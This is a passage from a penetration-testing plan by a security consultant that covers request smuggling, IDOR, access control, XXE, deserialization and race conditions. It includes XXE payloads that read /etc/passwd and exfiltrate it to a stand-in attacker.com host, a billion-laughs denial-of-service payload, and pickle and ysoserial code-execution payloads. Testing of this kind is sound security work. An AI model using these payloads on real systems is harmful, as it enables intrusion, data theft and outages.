        * Burp Suite:
            
            * Intruder: Test variations of headers and encodings.
            
            * Collaborator: Detect time-based smuggling attacks.
        
        * Netcat: Craft raw HTTP requests.
    
    * **Automated Tools**:
        
        * HTTP Request Smuggler (Burp Extension).
        
        * OWASP ZAP (Custom scripts for smuggling attacks).
        
        * Smuggler:
            
                python smuggler.py -u https://vulnerable.com
                
            
    
    * * *
    
    ### **7\.** **Mitigation Testing**
    
    * **What to Verify**:
        
        * Ensure consistent parsing of `Content-Length` and `Transfer-Encoding` headers.
        
        * Reject requests with:
            
            * Multiple `Content-Length` headers.
            
            * Both `Content-Length` and `Transfer-Encoding` headers.
        
        * Upgrade to HTTP/2 or HTTP/3 where possible.
        
        * Use robust WAFs to detect smuggling attempts.
        
    
    * * *
    
    ### **8\.** **Advanced Techniques**
    
    ### **a. Exploit Chained Servers**
    
    * **What to Do**:
        
        * Identify intermediary servers and exploit differences in their request parsing.
        
    
    ### **b. Exploit Response Splitting**
    
    * **What to Do**:
        
        * Inject CRLF payloads in smuggled requests to manipulate responses.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        * The server handles conflicting headers consistently and rejects malformed requests.
    
    * **Vulnerable**:
        * The server processes smuggled requests differently between layers, enabling request manipulation.
    

* **Insecure Direct Object References (IDOR)**
    
    ### **Insecure Direct Object References (IDOR)**
    
    **IDOR (Insecure Direct Object References)** vulnerabilities occur when an application does not properly enforce access control checks for direct access to objects like files, user accounts, or database records. Attackers can exploit IDOR to access or manipulate data they are not authorized to.
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * API endpoints with object identifiers:
            * Example: `/user/123`, `/order/567`.
        
        * Query parameters:
            * Example: `?id=123`, `?file=report.pdf`.
        
        * Form fields with object references:
            * Hidden fields like `<input type="hidden" name="user_id" value="123">`.
        
        * URL path parameters:
            * Example: `/products/123/details`.
        
        * Cookies or session tokens containing user or resource IDs.
        
    
    * * *
    
    ### **2\.** **Test for Horizontal Privilege Escalation**
    
    * **What to Do**:
        
        * Replace the identifier with another user‚Äôs identifier.
        
        * Examples:
            
            * `GET /user/123` ‚Üí `GET /user/124`
            
            * `POST /orders?order_id=567` ‚Üí `POST /orders?order_id=568`
        
        * **Expected Outcome**:
            
            * Vulnerable: The application allows access or modification of the target object.
            
            * Secure: The application enforces access control checks.
        
    
    * * *
    
    ### **3\.** **Test for Vertical Privilege Escalation**
    
    * **What to Do**:
        
        * Use an identifier meant for privileged users (e.g., admin IDs).
        
        * Examples:
            
            * `GET /admin/controls?user_id=123`
            
            * `POST /system/settings?config_id=1`
        
        * **Expected Outcome**:
            
            * Vulnerable: A low-privilege user can access or modify privileged resources.
            
            * Secure: The application enforces role-based access control.
        
    
    * * *
    
    ### **4\.** **Test with Enumeration**
    
    * **What to Do**:
        
        * Enumerate predictable identifiers (e.g., incrementing numbers).
        
        * Examples:
            
            * `GET /invoice/1001`
            
            * `GET /invoice/1002`
        
        * **Expected Outcome**:
            
            * Vulnerable: The application allows access to other users‚Äô data.
            
            * Secure: The application validates ownership of requested objects.
        
    
    * * *
    
    ### **5\.** **Test for Hidden Object References**
    
    * **Where to Look**:
        
        * Examine hidden form fields, cookies, or JavaScript variables.
        
        * Tools: Use browser developer tools or interceptors like Burp Suite.
        
    
    * **What to Do**:
        
        * Modify the hidden reference and resubmit the request:
            * Example: Change `user_id=123` to `user_id=124` in a hidden field.
        
    
    * * *
    
    ### **6\.** **Test for Bulk Access**
    
    * **What to Do**:
        
        * Attempt to fetch or modify multiple resources at once.
        
        * Examples:
            
            * API: `GET /users?ids=123,124,125`
            
            * File access: `GET /files?file=report1.pdf,report2.pdf`
        
        * **Expected Outcome**:
            
            * Vulnerable: Bulk access allows exposure of multiple objects.
            
            * Secure: Only authorized objects are returned or modified.
        
    
    * * *
    
    ### **7\.** **Test for Indirect Access**
    
    * **What to Do**:
        
        * Modify related objects or secondary references:
            * Example:
                
                * API: `GET /account?username=attacker`
                
                * Modify `username` to `victim`.
        
        * **Expected Outcome**:
            * Vulnerable: The application returns or modifies unauthorized data.
        
    
    * * *
    
    ### **8\.** **Advanced Techniques**
    
    ### **a. Test for Parameter Manipulation**
    
    * Modify additional parameters:
        
        * Example:
            
            * `GET /orders?user_id=123&order_id=567`
            
            * Change to `user_id=124`.
        
    
    * Check if changing one parameter bypasses validation.
        
    
    ### **b. Test for Object Deletion**
    
    * Replace object IDs in deletion requests:
        
        * Example:
            
            * `DELETE /files?file_id=123`
            
            * Change to `file_id=124`.
        
    
    ### **c. Test for File Access**
    
    * Replace file names or IDs:
        
        * Example:
            
            * `GET /files/report1.pdf`
            
            * Change to `report2.pdf`.
        
    
    * * *
    
    ### **9\.** **Tools for IDOR Testing**
    
    * **Manual**:
        
        * Browser developer tools (inspect hidden fields or cookies).
        
        * Burp Suite (Repeater to modify requests and parameters).
        
        * Postman (for API testing).
    
    * **Automated**:
        
        * OWASP ZAP.
        
        * Nuclei (IDOR templates).
    
    * * *
    
    ### **10\.** **Mitigation Testing**
    
    * Verify access control:
        
        * The application must validate object ownership or permissions.
        
    
    * Test for secure identifiers:
        
        * Use unpredictable identifiers like UUIDs instead of sequential IDs.
        
    
    * Implement authorization:
        
        * Enforce strict role-based access control (RBAC) policies.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Access to objects is strictly validated based on ownership or permissions.
        
        * Unauthorized modification or retrieval of resources is denied.
    
    * **Vulnerable**:
        * Users can access or manipulate data belonging to others.
    

* **Broken Access Control**
    
    ### **Broken Access Control**
    
    **Broken Access Control vulnerabilities** occur when an application fails to enforce proper access restrictions, allowing unauthorized users to perform restricted actions or access data. These vulnerabilities can be categorized as **Horizontal Privilege Escalation** (accessing another user's data) and **Vertical Privilege Escalation** (accessing higher-privileged functions).
    
    * * *
    
    ### **Horizontal Privilege Escalation Testing**
    
    ### **1\.** **Identify Input Points for User Data**
    
    * **Where to Test**:
        
        * URLs with user-specific identifiers:
            * Example: `/user/123/profile`, `/order/567`.
        
        * Query parameters:
            * Example: `?user_id=123`, `?account=567`.
        
        * Form fields, cookies, or session data with user references.
        
    
    ### **2\.** **Modify User Identifiers**
    
    * **What to Do**:
        
        * Replace your user ID or identifier with another user's:
            
            * Example: `/user/124/profile`
            
            * Query parameter: `?account=456`.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: Access or modify another user's data.
        
        * Secure: The server validates ownership and denies access.
        
    
    ### **3\.** **Test with Predictable Identifiers**
    
    * **What to Do**:
        
        * Enumerate sequential IDs or predictable patterns:
            * `/order/1001`, `/order/1002`.
        
        * Test for access to resources belonging to other users.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: Data from other users is exposed or modified.
        
        * Secure: Access is restricted based on the authenticated user's permissions.
        
    
    ### **4\.** **Test for Bulk Access**
    
    * **What to Do**:
        
        * Attempt to access or modify multiple users' data at once:
            * Example: `/users?ids=123,124,125`.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: The server returns or modifies unauthorized data.
        
        * Secure: Only authorized data is returned.
        
    
    * * *
    
    ### **Vertical Privilege Escalation Testing**
    
    ### **1\.** **Identify Privileged Actions**
    
    * **Where to Test**:
        
        * Administrative endpoints:
            * Example: `/admin/dashboard`, `/system/settings`.
        
        * Privileged API calls:
            * Example: `POST /admin/users`.
        
        * Configuration or management functions:
            * Example: `/config/update`.
        
    
    ### **2\.** **Modify Role-Based Parameters**
    
    * **What to Do**:
        
        * Use lower-privilege credentials to access privileged actions:
            * Example: Modify a query parameter like `role=admin`.
        
        * Inject elevated role identifiers in requests:
            * Example: `/dashboard?user_role=admin`.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: The application grants elevated privileges.
        
        * Secure: Role-based access control (RBAC) prevents unauthorized actions.
        
    
    ### **3\.** **Bypass UI Restrictions**
    
    * **What to Do**:
        
        * Directly access privileged endpoints hidden from the UI:
            * Example: Access `/admin/controls` directly.
        
        * Use developer tools to modify hidden fields:
            * Example:  
                  
                Change to  
                `admin`.
                
                    <input type="hidden" name="role" value="user">
                    
                
        
    
    * * *
    
    ### **Testing Both Horizontal and Vertical Escalation**
    
    ### **1\.** **API Endpoints**
    
    * **What to Do**:
        
        * Test APIs for broken access controls:
            
            * `GET /users/123/orders` (horizontal).
            
            * `POST /admin/settings` (vertical).
        
        * Modify request parameters or headers:
            * Example: Change `Authorization: Bearer <token>`.
        
    
    ### **2\.** **Multi-Tenant Systems**
    
    * **What to Do**:
        
        * Test for tenant isolation in multi-tenant systems:
            * Example: Access data from another tenant's workspace.
        
    
    ### **3\.** **Session Tokens**
    
    * **What to Do**:
        
        * Use session tokens from a lower-privileged user:
            * Replay the token with administrative endpoints.
        
    
    * **Expected Outcome**:
        
        * Vulnerable: Privileged actions are accessible with lower-privilege tokens.
        
    
    * * *
    
    ### **Testing Techniques**
    
    ### **1\.** **Forced Browsing**
    
    * **What to Do**:
        
        * Attempt to directly access URLs meant for higher-privileged users:
            * Example: `/admin/dashboard`.
        
    
    ### **2\.** **Parameter Tampering**
    
    * **What to Do**:
        
        * Modify parameters in requests:
            * Example: Change `user_id=123` to `user_id=124`.
        
    
    ### **3\.** **Hidden Field Manipulation**
    
    * **What to Do**:
        
        * Modify hidden fields in forms to escalate privileges:
            * `<input type="hidden" name="user_role" value="user">`.
        
    
    ### **4\.** **Direct API Calls**
    
    * **What to Do**:
        
        * Directly call APIs or endpoints meant for privileged users:
            * Example: `POST /api/admin/users`.
        
    
    ### **5\.** **Test Across Roles**
    
    * **What to Do**:
        
        * Use test accounts for different roles (user, admin, moderator).
        
        * Attempt to perform unauthorized actions between roles.
        
    
    * * *
    
    ### **Tools for Testing Broken Access Control**
    
    * **Manual Testing**:
        
        * Burp Suite (Repeater for modifying requests).
        
        * Postman (for API testing).
    
    * **Automated Tools**:
        
        * OWASP ZAP.
        
        * Nuclei (templates for broken access control).
        
        * Fuzzing tools (e.g., Intruder in Burp Suite).
    
    * **Monitoring and Logs**:
        * Inspect server logs for unauthorized access attempts.
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify:
        
        * Role-based access control (RBAC) implementation.
        
        * Ownership validation for resources.
        
        * Least privilege principle for user roles.
        
    
    * Ensure:
        
        * Privileged actions require elevated permissions.
        
        * Access to user-specific data is restricted to authenticated users.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Access control policies are strictly enforced for all users and roles.
        
        * Unauthorized actions or access attempts are blocked.
    
    * **Vulnerable**:
        * Users can perform unauthorized actions or access resources beyond their permissions.
    

* **XML External Entity ( XXE )**
    
    ### **XML External Entity (XXE)**
    
    **XML External Entity (XXE)** vulnerabilities occur when an application processes XML input that allows external entities to be declared and exploited. This can lead to sensitive data disclosure, remote code execution, or denial of service (DoS).
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Endpoints accepting XML input:
            
            * API endpoints (`POST /api/v1/data`).
            
            * File uploads (XML-based files like `.xml`, `.svg`).
            
            * SOAP-based web services.
            
            * SAML (Security Assertion Markup Language) integrations.
        
        * XML parsers in backend systems.
        
    
    * * *
    
    ### **2\.** **Test for Basic XXE**
    
    * **What to Do**:
        
        * Inject a basic XXE payload to test for processing:
            
                <!DOCTYPE foo [
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <foo>&xxe;</foo>
                
            
        
        * **Expected Outcome**:
            
            * Vulnerable: The server includes the content of `/etc/passwd` in the response.
            
            * Secure: The server rejects or ignores the payload.
        
    
    * * *
    
    ### **3\.** **Test for Blind XXE**
    
    * **What to Do**:
        
        * Inject payloads to trigger an external DNS or HTTP request:
            
                <!DOCTYPE foo [
                  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
                ]>
                <foo>&xxe;</foo>
                
            
        
        * **Tools**:
            * Use a DNS logger (e.g., Burp Collaborator or Interactsh) to confirm the request.
        
    
    * * *
    
    ### **4\.** **Out-of-Band Data Exfiltration**
    
    * **What to Do**:
        
        * Attempt to exfiltrate sensitive files via external requests:
            
                <!DOCTYPE foo [
                  <!ENTITY xxe SYSTEM "http://attacker.com?file=/etc/passwd">
                ]>
                <foo>&xxe;</foo>
                
            
        
        * **Expected Outcome**:
            
            * Vulnerable: The server sends sensitive data to the external domain.
            
            * Secure: No data is leaked.
        
    
    * * *
    
    ### **5\.** **Parameter Entities**
    
    * **What to Do**:
        
        * Use parameter entities to extend attack vectors:
            
                <!DOCTYPE foo [
                  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
                  <!ENTITY file "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
                ]>
                <foo>&file;</foo>
                
            
        
    
    * * *
    
    ### **6\.** **Exploit Common Files**
    
    * **What to Target**:
        
        * Linux:
            
            * `/etc/passwd`: User account details.
            
            * `/etc/hostname`: Hostname information.
            
            * `/var/log/auth.log`: Authentication logs.
        
        * Windows:
            
            * `C:\Windows\System32\drivers\etc\hosts`: Hosts file.
            
            * `C:\Windows\win.ini`: System configuration.
        
    
    * **Expected Outcome**:
        
        * Sensitive file contents are returned in the response or exfiltrated.
        
    
    * * *
    
    ### **7\.** **Test for XML Parser Misconfigurations**
    
    ### **a.** **Recursive Entities (Billion Laughs Attack)**
    
    * **What to Do**:
        
        * Trigger excessive memory usage with a recursive entity:
            
                <!DOCTYPE lolz [
                  <!ENTITY lol "lol">
                  <!ENTITY lol2 "&lol;&lol;&lol;">
                  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
                  <!ENTITY lol4 "&lol3;&lol3;&lol3;">
                ]>
                <foo>&lol4;</foo>
                
            
        
        * **Expected Outcome**:
            
            * Vulnerable: The server crashes or becomes unresponsive.
            
            * Secure: The server rejects the payload.
        
    
    ### **b.** **Large XML Payloads**
    
    * **What to Do**:
        
        * Send a large XML file to cause denial of service:
            * Example:
                
                    <foo>
                      <bar>...</bar>
                    </foo>
                    
                
        
    
    * * *
    
    ### **8\.** **Exploit SOAP Services**
    
    * **What to Do**:
        
        * Modify SOAP requests to include XXE payloads:
            
                <?xml version="1.0"?>
                <!DOCTYPE foo [
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
                  <soap:Body>
                    <foo>&xxe;</foo>
                  </soap:Body>
                </soap:Envelope>
                
            
        
    
    * * *
    
    ### **9\.** **Tools for XXE Testing**
    
    * **Manual Tools**:
        
        * Burp Suite (Intruder/Repeater for payload injection).
        
        * Postman (for API testing).
    
    * **Automated Tools**:
        
        * OWASP ZAP.
        
        * Nuclei (XXE templates).
        
        * Nikto.
        
        * XXE Injector.
    
    * * *
    
    ### **10\.** **Mitigation Testing**
    
    * **What to Verify**:
        
        * XML parsers are configured securely:
            
            * Disable DTDs (Document Type Definitions).
            
            * Use libraries that do not support external entities (e.g., `lxml` in Python with external entities disabled).
        
    
    * **Ensure Input Validation**:
        
        * Validate and sanitize XML input.
        
    
    * **Use Allowlists**:
        
        * Restrict accepted files and entities.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * The application rejects external entities or untrusted XML input.
        
        * Sensitive data is not disclosed or exfiltrated.
    
    * **Vulnerable**:
        * The application processes external entities, leading to data leakage or denial of service.
    

* **Serialization and Deserialization**
    
    ### **Serialization and Deserialization**
    
    **Serialization/Deserialization vulnerabilities** occur when untrusted data is deserialized without proper validation. These vulnerabilities can lead to arbitrary code execution, data tampering, or denial of service (DoS).
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * API endpoints accepting serialized objects.
        
        * File upload features handling serialized files (e.g., `.pickle`, `.ser`).
        
        * Hidden fields or cookies storing serialized data.
        
        * Applications using inter-process communication (IPC) mechanisms involving serialization.
        
    
    * * *
    
    ### **2\.** **Detect Serialized Data**
    
    * **Indicators of Serialization**:
        
        * Serialized formats:
            
            * Java: `rO0` (indicates Java Object Serialization).
            
            * PHP: `O:`, `s:`, `a:`.
            
            * Python (Pickle): `b'\x80\x03'`.
            
            * JSON or XML-based serialized objects.
        
        * Data encoded in Base64 or hexadecimal.
        
    
    * * *
    
    ### **3.** **Modify Serialized Data**
    
    * **What to Do**:
        
        * Decode and tamper with serialized data to manipulate application behavior.
        
        * Example: Modify object attributes.
            
            * Original: `{"role": "user"}`
            
            * Modified: `{"role": "admin"}`
        
    
    * * *
    
    ### **4\.** **Test for Arbitrary Code Execution**
    
    ### **a.** **Malicious Payload Injection**
    
    * **What to Do**:
        
        * Inject a malicious payload into the serialized object:
            
            * Java:
                
                    ysoserial.generate("CommonsCollections1", "calc.exe");
                    
                
            
            * Python:
                
                    import pickle
                    payload = b"\x80\x03c__builtin__\nexec\n(Vimport os;os.system('id')\ntR."
                    
                
        
        * **Expected Outcome**:
            
            * Vulnerable: The application executes arbitrary commands.
            
            * Secure: The application rejects or sanitizes the payload.
        
    
    ### **b.** **Test Common Exploit Chains**
    
    * **What to Do**:
        
        * Use tools like `ysoserial`, `ysoserial.net`, or `marshalsec` to generate payloads.
        
        * Example:
            
                java -jar ysoserial.jar CommonsCollections1 "touch /tmp/exploit" | base64
                
            
        
    
    * * *
    
    ### **5\.** **Test for Data Tampering**
    
    * **What to Do**:
        
        * Modify serialized data to escalate privileges:
            * Example:
                
                * Original: `{"role": "user"}`
                
                * Modified: `{"role": "admin"}`
        
        * **Expected Outcome**:
            
            * Vulnerable: The application processes the manipulated object.
            
            * Secure: The application validates the data or rejects the tampered object.
        
    
    * * *
    
    ### **6\.** **Test for DoS Vulnerabilities**
    
    * **What to Do**:
        
        * Send large or recursive serialized objects to test server behavior.
        
        * Example:
            * Python Pickle Recursive Payload:
                
                    payload = b'\x80\x03]q\x00(h\x00h\x00h\x00e.'
                    
                
        
        * **Expected Outcome**:
            
            * Vulnerable: The server crashes or becomes unresponsive.
            
            * Secure: The server rejects or handles large/recursive objects gracefully.
        
    
    * * *
    
    ### **7\.** **Analyze Application Responses**
    
    * **What to Look For**:
        
        * Error messages revealing deserialization details:
            
            * Stack traces mentioning deserialization libraries.
            
            * Messages like `java.io.InvalidClassException` or `pickle.UnpicklingError`.
        
    
    * * *
    
    ### **8\.** **Test with Encoded Data**
    
    * **What to Do**:
        
        * Encode or obfuscate payloads to bypass filters:
            
            * Base64 encode payloads:
                
                    echo "malicious_payload" | base64
                    
                
            
            * Test double-encoding (e.g., URL-encoded).
        
    
    * * *
    
    ### **9\.** **Tools for Serialization/Deserialization Testing**
    
    * **Manual Tools**:
        
        * Burp Suite (Decoder and Intruder for payload manipulation).
        
        * Postman (for API testing).
    
    * **Automated Tools**:
        
        * `ysoserial` (Java deserialization).
        
        * `ysoserial.net` (C# deserialization).
        
        * `marshalsec` (Java deserialization frameworks).
        
        * Python tools for `pickle` testing.
    
    * * *
    
    ### **10\.** **Mitigation Testing**
    
    * **What to Verify**:
        
        * Implement strong input validation:
            * Reject objects with unexpected types or attributes.
        
        * Use safer serialization formats:
            * JSON, Protocol Buffers, or XML with strict schemas.
        
        * Disable unsafe deserialization features:
            * Disable `Serializable` or equivalent features in frameworks.
        
        * Enforce signatures:
            * Digitally sign serialized objects to prevent tampering.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * The application rejects tampered or malicious serialized objects.
        
        * Proper validation prevents arbitrary code execution or data tampering.
    
    * **Vulnerable**:
        * The application processes malicious payloads, allowing code execution, privilege escalation, or denial of service.
    

* **Race Condition**
    
    ### **Race Condition**
    
    **Race conditions** occur when a system's behavior depends on the sequence or timing of uncontrollable events, such as multiple processes or threads accessing the same resource simultaneously. Exploiting race conditions can lead to inconsistent data, privilege escalation, double-spending, or unauthorized actions.
    
    * * *
    
    ### **1\.** **Identify Vulnerable Areas**
    
    * **Where to Test**:
        
        * File upload processes (overwriting files).
        
        * Payment gateways (double-spending or refunds).
        
        * User registration (duplicating accounts).
        
        * Authorization flows (e.g., privilege escalation).
        
        * Inventory management (e.g., purchasing items beyond stock limits).
        
        * Token redemption or coupon application systems.
        
    
    * * *
    
    ### **2\.** **Test for Data Corruption**
    
    ### **a.** **Simultaneous Updates**
    
    * **What to Do**:
        
        * Send multiple simultaneous requests to update the same resource.
        
        * Example:
            * User A updates account details while User B updates the same details.
        
        * **Expected Outcome**:
            
            * Vulnerable: The resource state becomes inconsistent.
            
            * Secure: Updates are serialized or last-write wins without corruption.
        
    
    ### **b.** **Inventory Manipulation**
    
    * **What to Do**:
        
        * Purchase the last item of a product stock from two accounts simultaneously.
        
        * **Expected Outcome**:
            
            * Vulnerable: Stock becomes negative or oversells.
            
            * Secure: Only one transaction succeeds.
        
    
    * * *
    
    ### **3\.** **Test for Double-Spending**
    
    ### **a.** **Payment Gateways**
    
    * **What to Do**:
        
        * Send multiple simultaneous payment requests for the same transaction.
        
        * Example:
            * Submit multiple `POST /payment` requests with the same payment ID.
        
        * **Expected Outcome**:
            
            * Vulnerable: Payment is processed multiple times.
            
            * Secure: Payment ID is used only once (idempotency).
        
    
    ### **b.** **Refund Exploitation**
    
    * **What to Do**:
        
        * Simultaneously request a refund for the same transaction.
        
        * **Expected Outcome**:
            
            * Vulnerable: Multiple refunds are processed.
            
            * Secure: Refunds are limited to one per transaction.
        
    
    * * *
    
    ### **4\.** **Test for Privilege Escalation**
    
    * **What to Do**:
        
        * Simultaneously submit requests to modify permissions.
        
        * Example:
            * Change user role to `admin` while logging in with another session.
        
        * **Expected Outcome**:
            
            * Vulnerable: Unauthorized privilege escalation occurs.
            
            * Secure: Access controls and race conditions are handled.
        
    
    * * *
    
    ### **5\.** **Test for File Race Conditions**
    
    ### **a.** **File Overwrite**
    
    * **What to Do**:
        
        * Upload two files with the same name simultaneously.
        
        * Example:
            * Upload `profile.jpg` from two sessions.
        
        * **Expected Outcome**:
            
            * Vulnerable: Files overwrite each other.
            
            * Secure: Unique naming conventions or locks prevent overwrites.
        
    
    ### **b.** **Symlink Race Conditions**
    
    * **What to Do**:
        
        * Replace a target file with a symlink during a file write operation.
        
        * **Expected Outcome**:
            
            * Vulnerable: Unauthorized file modifications.
            
            * Secure: The system verifies file paths before writing.
        
    
    * * *
    
    ### **6\.** **Exploit Time Gaps**
    
    ### **a.** **Token Redemption**
    
    * **What to Do**:
        
        * Redeem the same token or coupon simultaneously from multiple sessions.
        
        * **Expected Outcome**:
            
            * Vulnerable: The token is redeemed multiple times.
            
            * Secure: Tokens are marked as used after the first redemption.
        
    
    ### **b.** **Registration or Password Reset**
    
    * **What to Do**:
        
        * Submit multiple registration requests for the same email.
        
        * **Expected Outcome**:
            
            * Vulnerable: Duplicate accounts are created.
            
            * Secure: Email addresses are checked and locked during registration.
        
    
    * * *
    
    ### **7\.** **Automate Race Condition Testing**
    
    * **Tools**:
        
        * Burp Suite (Turbo Intruder or Intruder):
            * Configure multiple threads for simultaneous requests.
        
        * OWASP ZAP (Active Scan with custom scripts).
        
        * Race-the-Web:
            
            * Open-source tool for automating race condition testing.
            
                python3 racetheweb.py -u <target_url>
                
            
    
    * * *
    
    ### **8\.** **Test for Lock Mechanisms**
    
    * **What to Do**:
        
        * Attempt simultaneous updates to detect missing locks.
        
        * Examples:
            
            * File locks (prevent overwriting during read/write).
            
            * Database row locks (prevent duplicate writes).
        
        * **Expected Outcome**:
            
            * Vulnerable: Multiple updates are allowed simultaneously.
            
            * Secure: Locks prevent simultaneous access.
        
    
    * * *
    
    ### **9\.** **Mitigation Testing**
    
    * **What to Verify**:
        
        * Database constraints:
            * Ensure unique keys and transactions prevent duplicates.
        
        * Locking mechanisms:
            * Implement mutexes or file locks to prevent simultaneous access.
        
        * Atomic operations:
            * Ensure updates are atomic (e.g., using `CAS` or `ACID` principles).
        
        * Idempotency:
            * Ensure API requests (e.g., payments) are idempotent.
        
    
    * * *
    
    ### **10\.** **Expected Outcomes**
    
    * **Secure**:
        
        * Simultaneous or repeated requests are serialized or rejected.
        
        * No data corruption, privilege escalation, or double-spending occurs.
    
    * **Vulnerable**:
        * The application allows unauthorized actions or inconsistent states due to race conditions.
    
    * * *
    
    ### Thanks and Regards
    
    M. SIVA SANKAR ( Security Consultant )
    
    I hope you liked my Test Plan üôÇ
    
    Share ‚áí Follow me ‚áí on ‚áí Linkedin [https://www.linkedin.com/in/siva-sankar-hacker/](https://www.linkedin.com/in/siva-sankar-hacker/)
